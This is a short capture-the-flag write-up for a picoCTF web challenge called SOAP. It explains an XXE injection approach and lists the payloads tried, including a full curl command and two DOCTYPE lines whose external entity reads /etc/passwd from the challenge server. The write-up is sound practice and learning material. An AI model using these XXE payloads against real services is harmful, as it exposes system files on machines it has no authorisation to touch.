# SOAP

**Flag:** ``

Approach

- step 1<br>
We can intercept the request using BurpSuite to modify it.

- step 2<br>
We can make use of an XXE injection to interfere with the site's processing of the XML data.


![](https://github.com/adityachawla005/cryptonite_taskphase_Aditya/raw/main/TP2/Web%20Exploitation/assets/SOAP.png)



What you learned through solving this challenge:
<br>
- We learned about XXE injection and the different payloads.

Other incorrect methods you tried:
<br>
- Tried inspecting cURL,didnt get response.

```
curl -X POST http://saturn.picoctf.net:54219/data \
     -H "Content-Type: application/xml" \
     -H "Accept-Language: en-GB,en;q=0.9" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" \
     -H "Accept: */*" \
     -H "Origin: http://saturn.picoctf.net:54219" \
     -H "Referer: http://saturn.picoctf.net:54219/" \
     -H "Accept-Encoding: gzip, deflate, br" \
     -H "Connection: keep-alive" \
     -d '<?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE data [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
          ]>
          <data>
              <ID>&xxe;</ID>
          </data>'
```


Payloads tried:
```
  - <!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```



References
<br>
-[XXE](https://portswigger.net/web-security/xxe)

